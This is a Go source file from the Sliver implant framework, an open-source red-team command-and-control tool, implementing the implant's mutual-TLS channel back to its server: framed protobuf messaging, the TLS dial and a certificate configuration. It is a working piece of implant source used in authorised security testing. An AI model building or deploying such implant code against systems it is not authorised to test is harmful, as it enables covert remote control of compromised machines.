package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .MTLSc2Enabled}}

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"fmt"

	// {{if .Debug}}
	"log"
	// {{end}}

	"os"

	pb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the reciever can delimit messages properly
func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return &pb.Envelope{}, err
	}

	return envelope, nil
}

// tlsConnect - Get a TLS connection or die trying
func tlsConnect(address string, port uint16) (*tls.Conn, error) {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	return connection, nil
}

func getTLSConfig() *tls.Config {

	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Cannot load sliver certificate: %v", err)
		// {{end}}
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:          []tls.Certificate{certPEM},
		RootCAs:               caCertPool,
		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: rootOnlyVerifyCertificate,
	}
	tlsConfig.BuildNameToCertificate()

	return tlsConfig
}

// {{end}} -MTLSc2Enabled
